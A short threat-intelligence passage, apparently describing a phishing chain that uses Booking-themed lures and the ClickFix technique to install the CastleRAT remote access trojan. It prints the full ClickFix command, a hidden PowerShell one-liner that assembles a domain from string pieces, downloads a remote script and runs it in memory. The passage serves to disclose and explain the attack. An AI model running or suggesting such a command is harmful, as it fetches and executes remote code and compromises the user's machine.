New message from the guest 
```

The message contain a link leading to a Cloudflare verification. If completed, the user is directed to a Booking-themed verification. Once completed, the user is directed to a "Booking" presenting the ClickFix technique. If the user copies and pastes the PowerShell script as instructed, it will execute a second PowerShell script ultimately leading to the installation of CastleRAT (C Variant). 

ClickFix Command
```
powershell -w h -ep b -nop -c "$h='blkiesf.c'+'om/upd';iex(iwr $h -useb).Content"
```

The ClickFix Command retrieves a remote PowerShell script, which is fed into Invoke-Expression and run immediately in the current PowerShell process in memory.
This remote PowerShell script acts as an intermediate downloader/installer for a Zip payload.
